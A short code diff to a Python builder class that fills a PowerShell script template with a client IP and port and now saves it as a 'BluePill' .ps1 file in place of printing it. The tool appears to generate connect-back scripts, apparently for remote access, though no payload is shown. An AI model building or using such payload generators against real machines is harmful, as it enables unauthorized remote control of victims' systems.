@@ -17,7 +17,7 @@ from PIL import Image, ImageTk
 import base64
 import time
 import ast
-
+from datetime import datetime
 # 
 class builder:
 	def __init__(self, details: dict, file_type):
@@ -47,7 +47,9 @@ class builder:
 		ip = self.details['IP']
 		port = self.details['PORT']
 		script = script.replace("CLIENT_IP", ip).replace("CLIENT_PORT", port)
-		print(script)
+		filename = "BluePill " + datetime.now().strftime("%H:%M:%S") + ".ps1"
+		with open(filename, "w") as f:
+			f.write(script)
 
 def is_word_in_quotes(string, word):
     pattern = r'(["\'])(.*?)\1'
